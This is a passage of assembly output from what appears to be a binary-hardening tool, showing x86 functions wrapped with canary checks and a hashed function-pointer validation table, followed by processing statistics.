   call    _FuncWrapperHeader      # 2. my address is 0x804acb8
   .long    Func_0x804aa80  #pp1w: Label_0x804aa80 VAR_ADDRESS #32
   jmp     Label_0x804ae04 #32
Label_0x804acc2: #p6a
   cmp     $0x72, %ecx                        # [74(3036)]   #32
   jg      Label_0x804acf2 #32
   cmp     $0x63, %ecx                        # [76(3038)]   #32
   jne     Label_0x804ad13 #32
   mov     0x54(%esp), %eax                   # [78(3040)]   #32
   lea     0x4(%eax), %ecx                    # [79(3041)] Loading Pointer with stackSize: 108   #32
   mov     %ecx, 0x54(%esp)                   # [80(3042)]   #32
   mov     (%eax), %al                        # [81(3043)]Using Pointer PTRCHECK arg[0]    #32
   mov     %al, 0x37(%esp)                    # [82(3044)]   #32
   lea     0x38(%esp), %eax                   # [83(3045)] Loading Pointer with stackSize: 108   #32
   mov     %eax, 0xc(%esp)                    # [84(3046)]   #32
   lea     0x37(%esp), %eax                   # [85(3047)] Loading Pointer with stackSize: 108   #32
   mov     %eax, 0x4(%esp)                    # [86(3048)]   #32
   jmp     Label_0x804adf4 #32
Label_0x804acf2: #p6a
   cmp     $0x73, %ecx                        # [88(3050)]   #32
   je      Label_0x804ad7d #32
   cmp     $0x75, %ecx                        # [90(3052)]   #32
   jne     Label_0x804add6 #32
   mov     0x54(%esp), %eax                   # [92(3054)]   #32
   lea     0x4(%eax), %ecx                    # [93(3055)] Loading Pointer with stackSize: 108   #32
   mov     %ecx, 0x54(%esp)                   # [94(3056)]   #32
   mov     (%eax), %eax                       # [95(3057)]Using Pointer PTRCHECK arg[0]    #32
   jmp     Label_0x804ad5c #32
Label_0x804ad13: #p6a
   cmp     $0x64, %ecx                        # [97(3059)]   #32
   jne     Label_0x804ade0 #32
   mov     0x54(%esp), %eax                   # [99(3061)]   #32
   lea     0x4(%eax), %ecx                    # [100(3062)] Loading Pointer with stackSize: 108   #32
   mov     %ecx, 0x54(%esp)                   # [101(3063)]   #32
   mov     (%eax), %eax                       # [102(3064)]Using Pointer PTRCHECK arg[0]    #32
   test    %eax, %eax                         # [103(3065)]   #32
   jns     Label_0x804ad5c #32
   movb    $0x2d, 0x3f(%esp)                  # [105(3067)]   #32
   mov     %eax, 0x20(%esp)                   # [106(3068)]   #32
   lea     0x40(%esp), %eax                   # [107(3069)] Loading Pointer with stackSize: 108   #32
   mov     %eax, 0xc(%esp)                    # [108(3070)]   #32
   lea     0x3f(%esp), %eax                   # [109(3071)] Loading Pointer with stackSize: 108   #32
   mov     %eax, 0x4(%esp)                    # [110(3072)]   #32
   mov     %edi, (%esp)                       # [111(3073)]   #32
   movl    $0x1, 0x8(%esp)                    # [112(3074)]   #32
   call    _transmit                          # [113(3075)]  System Call to transmit() #32
   mov     0x20(%esp), %eax                   # [114(3076)]   #32
   neg     %eax                               # [115(3077)]   #32
Label_0x804ad5c: #p6a
   mov     %ebx, 0x10(%esp)                   # [116(3078)]   #32
   mov     %esi, 0xc(%esp)                    # [117(3079)]   #32
   mov     %eax, 0x4(%esp)                    # [118(3080)]   #32
   mov     %edi, (%esp)                       # [119(3081)]   #32
   movl    $0xa, 0x8(%esp)                    # [120(3082)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804ad73
   .long    Func_0x804aa80  #pp1w: Label_0x804aa80 VAR_ADDRESS #32
   jmp     Label_0x804ae04 #32
Label_0x804ad7d: #p6a
   mov     0x54(%esp), %eax                   # [123(3085)]   #32
   lea     0x4(%eax), %ecx                    # [124(3086)] Loading Pointer with stackSize: 108   #32
   mov     %ecx, 0x54(%esp)                   # [125(3087)]   #32
   mov     (%eax), %esi                       # [126(3088)]Using Pointer PTRCHECK arg[0]    #32
   mov     %esi, (%esp)                       # [127(3089)]   #32
   call    Func_0x804b2e0  #pp1: Label_0x804b2e0 VAR_ADDRESS #32
   xor     %ebx, %ebx                         # [129(3091)]   #32
   test    %eax, %eax                         # [130(3092)]   #32
   je      Label_0x804ae04 #32
Label_0x804ada0: #p6a
   mov     (%esi, %ebx ,  0x1), %al           # [132(3094)]Using Pointer PTRCHECK arg[0]    # <<<=== Need to Address an Array
   mov     %al, 0x47(%esp)                    # [133(3095)]   #32
   lea     0x48(%esp), %eax                   # [134(3096)] Loading Pointer with stackSize: 108   #32
   mov     %eax, 0xc(%esp)                    # [135(3097)]   #32
   lea     0x47(%esp), %eax                   # [136(3098)] Loading Pointer with stackSize: 108   #32
   mov     %eax, 0x4(%esp)                    # [137(3099)]   #32
   mov     %edi, (%esp)                       # [138(3100)]   #32
   movl    $0x1, 0x8(%esp)                    # [139(3101)]   #32
   call    _transmit                          # [140(3102)]  System Call to transmit() #32
   add     $0x1, %ebx                         # [141(3103)]   #32
   mov     %esi, (%esp)                       # [142(3104)]   #32
   call    Func_0x804b2e0  #pp1: Label_0x804b2e0 VAR_ADDRESS #32
   cmp     %eax, %ebx                         # [144(3106)]   #32
   jb      Label_0x804ada0 #32
   jmp     Label_0x804ae04 #32
Label_0x804add6: #p6a
   cmp     $0x78, %ecx                        # [147(3109)]   #32
   je      Label_0x804ac94 #32
Label_0x804ade0: #p6a
   mov     %al, 0x2f(%esp)                    # [149(3111)]   #32
   lea     0x30(%esp), %eax                   # [150(3112)] Loading Pointer with stackSize: 108   #32
   mov     %eax, 0xc(%esp)                    # [151(3113)]   #32
   lea     0x2f(%esp), %eax                   # [152(3114)] Loading Pointer with stackSize: 108   #32
   mov     %eax, 0x4(%esp)                    # [153(3115)]   #32
Label_0x804adf4: #p6a
   mov     %edi, (%esp)                       # [154(3116)]   #32
   movl    $0x1, 0x8(%esp)                    # [155(3117)]   #32
   call    _transmit                          # [156(3118)]  System Call to transmit() #32
Label_0x804ae04: #p6a
   mov     0x58(%esp), %eax                   # [157(3119)]   #32
   cmpb    $0x0, (%eax)                       # [158(3120)]Using Pointer PTRCHECK arg[1]    #32
   jne     Label_0x804abe0 #32
Label_0x804ae11: #p6a
   xor     %eax, %eax                         # [160(3122)]   #32
   add     $0x5c, %esp                        # [161(3123)]stackSize = 0x10   #32
   pop     %esi                               # [162(3124)]stackSize = 0xc   #32
   pop     %edi                               # [163(3125)]stackSize = 0x8   #32
   pop     %ebx                               # [164(3126)]stackSize = 0x4   #32
   pop     %ebp                               # [165(3127)]stackSize = 0x0   #32
Label_0x804ae1a: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:54 Patched 0 in 0.002 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 89   [[ SAFE FUNCTION ]]: setjmp

     adding function wrapper

;     Start Index : 3908 (0x804b681)
;       End Index : 3917 (0x804b69b)
;   Num Instructs : 10
;      Stack Size : 0 (0x0)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 1
;     ESP Offsets : 2
;                 :  0x0(0x0),
;      ESP Params : 
;                 :  0x4(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x1620,7
.p2align 3,0x1625
FuncPtr_0x804b681:

Func_0x804b681:

_setjmp:

Label_0x804b681:
   mov     0x4(%esp), %ecx
   mov     (%esp), %edx
   mov     %esp, 0x8(%ecx)
   mov     %edx, (%ecx)
   mov     %ebx, 0x4(%ecx)
   mov     %ebp, 0xc(%ecx)
   mov     %esi, 0x10(%ecx)
   mov     %edi, 0x14(%ecx)
   xor     %eax, %eax
   ret


/*-------------------------
;
;   Function 93
     adding function wrapper

;     Start Index : 3381 (0x804b150)
;       End Index : 3422 (0x804b1c1)
;   Num Instructs : 42
;      Stack Size : 16 (0x10)
;          Pushes : 3 (0x3)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 4
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 2
;      Local Vars : 0
;      ESP Others : 1
;     ESP Offsets : 3
;                 :  0x0(0x10),
;      ESP Params : 
;                 :  0x20(0x4), 0x24(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 3
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x1020,7
.p2align 3,0x1025
FuncPtr_0x804b150:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804b150,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804b150:

Label_0x804b150:
   push    %ebx                               # [0(3381)]stackSize = 0x4   #32
   push    %edi                               # [1(3382)]stackSize = 0x8   #32
   push    %esi                               # [2(3383)]stackSize = 0xc   #32
   sub     $0x10, %esp                        # [3(3384)]stackSize = 0x1c   #32
   mov     0x24(%esp), %ebx                   # [4(3385)]   #32
   mov     (%ebx), %al                        # [5(3386)]Using Pointer PTRCHECK arg[0]    #32
   test    %al, %al                           # [6(3387)]   #32
   mov     0x28(%esp), %edi                   # [7(3388)]# FLAGS USED   #32
   je      Label_0x804b19f #32
Label_0x804b170: #p6a
   mov     (%edi), %cl                        # [9(3390)]Using Pointer PTRCHECK arg[0]    #32
   test    %cl, %cl                           # [10(3391)]   #32
   je      Label_0x804b19f #32
   movzbl  %al, %eax                          # [12(3393)]   #32
   cmp     %cl, %al                           # [13(3394)]   #32
   je      Label_0x804b196 #32
   mov     %eax, (%esp)                       # [15(3396)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804b180
   .long    Func_0x804a4a0  #pp1w: Label_0x804a4a0 VAR_ADDRESS #32
   mov     %eax, %esi                         # [17(3398)]   #32
   movzbl  (%edi), %eax                       # [18(3399)]Using Pointer PTRCHECK arg[0]  Already checked [9]   #32
   mov     %eax, (%esp)                       # [19(3400)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804b18d
   .long    Func_0x804a4a0  #pp1w: Label_0x804a4a0 VAR_ADDRESS #32
   cmp     %eax, %esi                         # [21(3402)]   #32
   jne     Label_0x804b19f #32
Label_0x804b196: #p6a
   add     $0x1, %edi                         # [23(3404)]   #32
   mov     0x1(%ebx), %al                     # [24(3405)]Using Pointer PTRCHECK arg[0]    #32
   add     $0x1, %ebx                         # [25(3406)]   #32
   test    %al, %al                           # [26(3407)]   #32
   jne     Label_0x804b170 #32
Label_0x804b19f: #p6a
   movzbl  (%ebx), %eax                       # [28(3409)]Using Pointer PTRCHECK arg[0]  Already checked [5]   #32
   mov     %eax, (%esp)                       # [29(3410)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804b1a5
   .long    Func_0x804a4a0  #pp1w: Label_0x804a4a0 VAR_ADDRESS #32
   mov     %eax, %esi                         # [31(3412)]   #32
   movzbl  (%edi), %eax                       # [32(3413)]Using Pointer PTRCHECK arg[0]  Already checked [18, 9]   #32
   mov     %eax, (%esp)                       # [33(3414)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804b1b2
   .long    Func_0x804a4a0  #pp1w: Label_0x804a4a0 VAR_ADDRESS #32
   sub     %eax, %esi                         # [35(3416)]   #32
   mov     %esi, %eax                         # [36(3417)]   #32
   add     $0x10, %esp                        # [37(3418)]stackSize = 0xc   #32
   pop     %esi                               # [38(3419)]stackSize = 0x8   #32
   pop     %edi                               # [39(3420)]stackSize = 0x4   #32
   pop     %ebx                               # [40(3421)]stackSize = 0x0   #32
Label_0x804b1c1: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:93 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 95   [[ SAFE FUNCTION ]]: longjmp

     adding function wrapper

;     Start Index : 3918 (0x804b69c)
;       End Index : 3930 (0x804b6bd)
;   Num Instructs : 13
;      Stack Size : 0 (0x0)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 2
;      Local Vars : 0
;      ESP Others : 1
;     ESP Offsets : 3
;                 :  0x0(0x0),
;      ESP Params : 
;                 :  0x4(0x4), 0x8(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x4120,7
.p2align 3,0x4125
FuncPtr_0x804b69c:

Func_0x804b69c:

_longjmp:

Label_0x804b69c:
   mov     0x4(%esp), %edx
   mov     0x8(%esp), %eax
   mov     (%edx), %ecx
   mov     0x4(%edx), %ebx
   mov     0x8(%edx), %esp
   mov     0xc(%edx), %ebp
   mov     0x10(%edx), %esi
   mov     0x14(%edx), %edi
   test    %eax, %eax
   jne     _LongJumpLab1
   inc     %eax
_LongJumpLab1:
   mov     %ecx, (%esp)
   cmpl   $0x804b707, %ecx
jb _FPSearch
 ret
_FPSearch:
call _FunctionPointerSearch


/*-------------------------
;
;   Function 66
-------------------------*/
FuncPtr_0x804b6be:
Func_0x804b6be:
ret
/* ----------- _crcx  NOT CALLED ------------*/


/*-------------------------
;
;   Function 96
     adding function wrapper

;     Start Index : 2351 (0x804a400)
;       End Index : 2363 (0x804a423)
;   Num Instructs : 13
;      Stack Size : 12 (0xc)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 1
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 1
;     ESP Offsets : 2
;                 :  0x0(0xc),
;      ESP Params : 
;                 :  0x10(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x720,7
.p2align 3,0x725
FuncPtr_0x804a400:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804a400,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804a400:

Label_0x804a400:
   sub     $0xc, %esp                         # [0(2351)]stackSize = 0xc   #32
   mov     0x14(%esp), %eax                   # [1(2352)]   #32
   cmp     $0x20, %eax                        # [2(2353)]   #32
   jne     Label_0x804a410 #32
   xor     %eax, %eax                         # [4(2355)]   #32
   jmp     Label_0x804a41d #32
Label_0x804a410: #p6a
   mov     %eax, (%esp)                       # [6(2357)]   #32
   call    Func_0x804a430  #pp1: Label_0x804a430 VAR_ADDRESS #32
   test    %eax, %eax                         # [8(2359)]   #32
   setne   %al                                # [9(2360)]   #32
Label_0x804a41d: #p6a
   movzbl  %al, %eax                          # [10(2361)]   #32
   add     $0xc, %esp                         # [11(2362)]stackSize = 0x0   #32
Label_0x804a423: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:96 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 67
     adding function wrapper

;     Start Index : 3951 (0x804b6ee)
;       End Index : 3963 (0x804b707)
;   Num Instructs : 13
;      Stack Size : 0 (0x0)
;          Pushes : 2 (0x2)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 3
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 3
;      ESP Params : 
;                 :  0xc(0x4), 0x10(0x4), 0x14(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x2420,7
.p2align 3,0x2425
FuncPtr_0x804b6ee:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804b6ee,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804b6ee:

Label_0x804b6ee:
   push    %esi                               # [0(3951)]stackSize = 0x4   #32
   push    %ecx                               # [1(3952)]stackSize = 0x8   #32
   mov     0x10(%esp), %ecx                   # [2(3953)]   #32
   mov     0x14(%esp), %esi                   # [3(3954)]   #32
   mov     0x18(%esp), %eax                   # [4(3955)]   #32
   sub     %esi, %ecx                         # [5(3956)]# FLAGS USED   #32
   je      Label_0x804b705 #32
Label_0x804b700: #p6a
   xor     (%esi), %al                        # [7(3958)]Using Pointer PTRCHECK arg[0]    #32
   add     $0x1, %esi                         # [8(3959)]   #32
   loop    Label_0x804b700                    # [9(3960)]   #32
Label_0x804b705: #p6a
   pop     %ecx                               # [10(3961)]stackSize = 0x4   #32
   pop     %esi                               # [11(3962)]stackSize = 0x0   #32
Label_0x804b707: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:67 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 98
     adding function wrapper

;     Start Index : 3430 (0x804b1d0)
;       End Index : 3443 (0x804b1f8)
;   Num Instructs : 14
;      Stack Size : 8 (0x8)
;          Pushes : 1 (0x1)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 2
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 2
;      Local Vars : 0
;      ESP Others : 2
;     ESP Offsets : 4
;                 :  0x0(0x8), 0x4(0x4),
;      ESP Params : 
;                 :  0x10(0x4), 0x14(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x6120,7
.p2align 3,0x6125
FuncPtr_0x804b1d0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804b1d0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804b1d0:

Label_0x804b1d0:
   push    %esi                               # [0(3430)]stackSize = 0x4   #32
   sub     $0x8, %esp                         # [1(3431)]stackSize = 0xc   #32
   mov     0x14(%esp), %esi                   # [2(3432)]   #32
   mov     %esi, (%esp)                       # [3(3433)]   #32
   call    Func_0x804b2e0  #pp1: Label_0x804b2e0 VAR_ADDRESS #32
   add     %esi, %eax                         # [5(3435)]   #32
   mov     0x18(%esp), %ecx                   # [6(3436)]   #32
   mov     %ecx, 0x4(%esp)                    # [7(3437)]   #32
   mov     %eax, (%esp)                       # [8(3438)]   #32
   call    Func_0x804b260  #pp1: Label_0x804b260 VAR_ADDRESS #32
   mov     %esi, %eax                         # [10(3440)]   #32
   add     $0x8, %esp                         # [11(3441)]stackSize = 0x4   #32
   pop     %esi                               # [12(3442)]stackSize = 0x0   #32
Label_0x804b1f8: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:98 Patched 0 in 0.0 seconds
;;;;;;;*/ 
/* -- patches for missing 'small functions' if needed --*/
 /* ---------------- Special Functions -------------*/

/*  ----------------------------------------------------------
# hash search
# assumes search key is on stack as first parameter, 
# move to : -0x8(%ebp)
# result -0x4(%ebp)
# search -0x8(%ebp)
# x=K/t; y=K mod t; index=HashRowOffsets[x]+y 
from http://www.drdobbs.com/architecture-and-design/generating-perfect-hash-functions/184404506
# return address at 0xc(%esp);
# searching address at 0x10(%esp);  -- will change to correct addr
--------------------------------------------------------------*/

_FunctionPointerSearch: 
   push   %ebx
   push   %eax
   push   %edx
   mov    0x10(%esp), %eax
   cmpl   $0x80480a0, %eax
   jb     _EndLoopNotFound
   cmpl   $0x804b707, %eax
   ja     _EndLoopNotFound
   subl   $0x364e, %eax
   andl   $0x3fff, %eax
   mov    %eax,%edx
   shrl   $0x7, %eax
   movl   $0x7f, %ebx
   and    %ebx,%edx
   cmpl   $0x7f, %eax
   ja     _EndLoopNotFound
   add    HashRowOffsets(,%eax,4),%edx
   mov    HashArray(,%edx,4),%ebx
   test   %ebx,%ebx
   jnz    _RetLabel
_EndLoopNotFound:
   mov    0x10(%esp), %eax
   mov    $0x0badc0de, %ecx
   jmp    *%ecx
  # terminate with bad address in eax

_RetLabel:
   mov    %ebx,_CallAddress    # and store new jmp/call loc 
   mov    0xc(%esp),%eax       # Get original return address 
   mov    %eax,0x10(%esp)       # and store change 
_Exit:
   pop    %edx
   pop    %eax
   pop    %ebx

   lea    0x4(%esp),%esp
   jmp   *_CallAddress

.p2align 4,0x85,7
.p2align 3,0x85
_FuncWrapperHeader:
   lea     -0x4(%esp),%esp # make space for canary
   push    %eax
   mov     0x8(%esp),%eax    # get original return address
   add     $0x4, %eax
   mov     %eax, 0x8(%esp)   # update return address
   mov     -0x4(%eax),%eax   #get stored call address
   mov     %eax, _CallAddress

_FuncWrapperHeader1:
   mov     0x8(%esp),%eax # get return address
   xorl    (_RAND),%eax
   mov     %eax,0x4(%esp)         #store canary 
   pop    %eax
   jmp     *_CallAddress

.p2align 4,0x85,7
.p2align 3,0x85
_FuncWrapperFooterWithArg:
   push    %eax
   movl    0x8(%esp),%eax
   xorl    (_RAND),%eax
   cmpl    0xc(%esp), %eax
   jne     _myterminate
   movl    %eax, _CallAddress
   mov     0x4(%esp),%eax
   lea     0x10(%esp,%eax,1),%esp
   neg     %eax
   movl    -0x10(%esp,%eax,1),%eax
   jmp     *_CallAddress

.p2align 4,0x85,7
.p2align 3,0x85
_FuncWrapperFooter:
   push    %eax
   movl    0x4(%esp),%eax
   xorl    (_RAND),%eax
   cmpl    0x8(%esp), %eax
   jne     _myterminate
   pop     %eax
   lea     0x4(%esp),%esp
   ret
.p2align 4,0x85,7
.p2align 3,0x85
_FuncWrapperFooterJmpSafe:
   push    %eax
   movl    0x8(%esp),%eax
   xorl    (_RAND),%eax
   cmpl    0xc(%esp), %eax
   jne     _myterminate
   movl    0x4(%esp),%eax
   movl    %eax, _CallAddress
   pop     %eax
   lea     0x8(%esp),%esp
   jmp     *_CallAddress

_myterminate:
   mov    $0xBADC0DE,%ebx
   mov    $0xfffffffe,%eax
   addl    $03,%eax
   int    $0x80
/* ------------- My New Data ------------ */

/* ---- Unique Globals (83) --- 
0x80480a0
0x804b5b5
0x804b708
0x804b70b
0x804b737
0x804b74a
0x804b750
0x804b753
0x804b756
0x804b759
0x804b75c
0x804b760
0x804b764
0x804b768
0x804b76c
0x804b770
0x804b774
0x804b778
0x804b77c
0x804b780
0x804b78c
0x804b797
0x804b7a3
0x804b7cb
0x804b7e3
0x804b80b
0x804b832
0x804b847
0x804b85d
0x804b879
0x804b8ac
0x804b8ae
0x804b8ba
0x804b8e1
0x804b8f9
0x804b912
0x804b925
0x804b949
0x804b95d
0x804b969
0x804b97c
0x804b97e
0x804b9ab
0x804b9b8
0x804b9c2
0x804b9d4
0x804ba05
0x804ba10
0x804ba21
0x804ba2e
0x804ba37
0x804ba79
0x804baa5
0x804bad8
0x804bae7
0x804baf9
0x804bb06
0x804bb0f
0x804bb1a
0x804bb1c
0x804bb39
0x804bb8f
0x804bb9a
0x804bbaa
0x804bc2a
0x804c000
0x804c004
0x804c008
0x804c00c
0x804c010
0x804c090
0x804caff
0x80602a8
0x80602ac
0x80602b0
0x80602b4
0x80602b5
0x80604b8
0x80604bc
0x80604c0
0x80604c4
0x80604c8
0x8060544
---------------------------*/
/* ------------- Original Data ------------ */
_DataStart:
/* -------------- LOOP ANALYSIS -------------- 
 Found 0 Loops: 

  Total bytes in loops: 0
 --------------------------------------------- */
/* -------------- Optimizations -------------- 

    Optimize 1 redundant moves:         0
    Optimize 2 redundant jumps:         1
    Optimize 3 remove jumps to nowhere: 0
 --------------------------------------------- */
/* ---------------------------------------------

 Processing 3964 instructions took: 
   0: 0.263 seconds
   1: 0.876 seconds
   2: 0.885 seconds
   3: 0.968 seconds
   4: 0.971 seconds
   5: 1.009 seconds
   6: 1.009 seconds
   7: 1.009 seconds
   8: 1.009 seconds
   9: 1.011 seconds
   10: 1.022 seconds

 Processing functions (3731 ins) took: 
     call:  0.003
     ret:  0.001
     copy:  0.0
     tot:  0.036
       Total time   : 1.009 seconds

 --------------------------------------------- */

/*  --------------------- .rodata1 ----------------------*/

/*  --- Hashing info   --- 
successful       : true
t value          : 128
random           : 0
Number of keys   : 99
Hash table size  : 122
Hash table Max   : 16384
Table utilization: 81.14754098360656
diff             : 13902

 ----------------------- */
HashRowOffsets:
   .long   0x0 # +0
   .long   0x0 # +1
   .long   0xffffffff # +2
   .long   0xffffffff # +3
   .long   0xffffffff # +4
   .long   0xffffffff # +5
   .long   0xffffffff # +6
   .long   0xffffffff # +7
   .long   0xffffffff # +8
   .long   0xffffffff # +9
   .long   0xffffffff # +10
   .long   0xffffffff # +11
   .long   0xffffffff # +12
   .long   0xffffffff # +13
   .long   0xffffffff # +14
   .long   0xffffffff # +15
   .long   0xffffffff # +16
   .long   0xffffffff # +17
   .long   0xffffffff # +18
   .long   0xffffffff # +19
   .long   0x3 # +20
   .long   0xb # +21
   .long   0xffffffff # +22
   .long   0xffffffff # +23
   .long   0x8 # +24
   .long   0x9 # +25
   .long   0xffffffff # +26
   .long   0xc # +27
   .long   0x0 # +28
   .long   0x6 # +29
   .long   0x6 # +30
   .long   0xffffffff # +31
   .long   0xffffffff # +32
   .long   0x7 # +33
   .long   0xa # +34
   .long   0xffffffff # +35
   .long   0xe # +36
   .long   0xffffffff # +37
   .long   0x8 # +38
   .long   0xffffffff # +39
   .long   0xffffffff # +40
   .long   0xffffffff # +41
   .long   0x8 # +42
   .long   0xffffffff # +43
   .long   0xffffffff # +44
   .long   0xffffffff # +45
   .long   0xffffffff # +46
   .long   0xffffffff # +47
   .long   0xffffffff # +48
   .long   0x9 # +49
   .long   0xb # +50
   .long   0xb # +51
   .long   0xffffffff # +52
   .long   0xffffffff # +53
   .long   0xffffffff # +54
   .long   0xffffffff # +55
   .long   0xc # +56
   .long   0x1 # +57
   .long   0xffffffff # +58
   .long   0xc # +59
   .long   0xffffffff # +60
   .long   0xc # +61
   .long   0xffffffff # +62
   .long   0x2 # +63
   .long   0x4 # +64
   .long   0xffffffff # +65
   .long   0x1 # +66
   .long   0x6 # +67
   .long   0x1 # +68
   .long   0x2 # +69
   .long   0x4 # +70
   .long   0xffffffff # +71
   .long   0x0 # +72
   .long   0xffffffff # +73
   .long   0x1 # +74
   .long   0xffffffff # +75
   .long   0x5 # +76
   .long   0xffffffff # +77
   .long   0xffffffff # +78
   .long   0xffffffff # +79
   .long   0x5 # +80
   .long   0x6 # +81
   .long   0xffffffff # +82
   .long   0xffffffff # +83
   .long   0xffffffff # +84
   .long   0xffffffff # +85
   .long   0xffffffff # +86
   .long   0x7 # +87
   .long   0xffffffff # +88
   .long   0xa # +89
   .long   0x0 # +90
   .long   0x3 # +91
   .long   0x2 # +92
   .long   0x6 # +93
   .long   0x8 # +94
   .long   0xffffffff # +95
   .long   0x7 # +96
   .long   0xd # +97
   .long   0x3 # +98
   .long   0x5 # +99
   .long   0xffffffff # +100
   .long   0x8 # +101
   .long   0x7 # +102
   .long   0x8 # +103
   .long   0x9 # +104
   .long   0xffffffff # +105
   .long   0x9 # +106
   .long   0xffffffff # +107
   .long   0xffffffff # +108
   .long   0xffffffff # +109
   .long   0xffffffff # +110
   .long   0x9 # +111
   .long   0xffffffff # +112
   .long   0xa # +113
   .long   0xffffffff # +114
   .long   0xffffffff # +115
   .long   0xffffffff # +116
   .long   0x9 # +117
   .long   0xb # +118
   .long   0x5 # +119
   .long   0x4 # +120
   .long   0xa # +121
   .long   0x7 # +122
   .long   0xb # +123
   .long   0xd # +124
   .long   0xffffffff # +125
   .long   0x1 # +126
   .long   0x1 # +127

HashArray:
   .long   0x0
   .long   0x0
   .long   FuncPtr_0x804a350 # 2 key=11522 x=90 y=2 index= 2
   .long   FuncPtr_0x8049750 # 3 key=8450 x=66 y=2 index= 3
   .long   FuncPtr_0x804a450 # 4 key=11778 x=92 y=2 index= 4
   .long   FuncPtr_0x804b653 # 5 key=5 x=0 y=5 index= 5
   .long   FuncPtr_0x804b5d3 # 6 key=16261 x=127 y=5 index= 6
   .long   FuncPtr_0x804b1d0 # 7 key=15234 x=119 y=2 index= 7
   .long   FuncPtr_0x804a4d0 # 8 key=11906 x=93 y=2 index= 8
   .long   FuncPtr_0x804a950 # 9 key=13058 x=102 y=2 index= 9
   .long   FuncPtr_0x804a9d0 # 10 key=13186 x=103 y=2 index= 10
   .long   FuncPtr_0x804aa50 # 11 key=13314 x=104 y=2 index= 11
   .long   FuncPtr_0x804a2d0 # 12 key=11394 x=89 y=2 index= 12
   .long   FuncPtr_0x804b150 # 13 key=15106 x=118 y=2 index= 13
   .long   FuncPtr_0x80493d0 # 14 key=7554 x=59 y=2 index= 14
   .long   0x0
   .long   0x0
   .long   0x0
   .long   FuncPtr_0x8048460 # 18 key=3602 x=28 y=18 index= 18
   .long   FuncPtr_0x80492e0 # 19 key=7314 x=57 y=18 index= 19
   .long   FuncPtr_0x804a460 # 20 key=11794 x=92 y=18 index= 20
   .long   FuncPtr_0x804a3e0 # 21 key=11666 x=91 y=18 index= 21
   .long   FuncPtr_0x804b260 # 22 key=15378 x=120 y=18 index= 22
   .long   FuncPtr_0x804a7e0 # 23 key=12690 x=99 y=18 index= 23
   .long   FuncPtr_0x8048560 # 24 key=3858 x=30 y=18 index= 24
   .long   FuncPtr_0x804b667 # 25 key=25 x=0 y=25 index= 25
   .long   FuncPtr_0x804a560 # 26 key=12050 x=94 y=18 index= 26
   .long   FuncPtr_0x804b0e0 # 27 key=14994 x=117 y=18 index= 27
   .long   FuncPtr_0x804b2e0 # 28 key=15506 x=121 y=18 index= 28
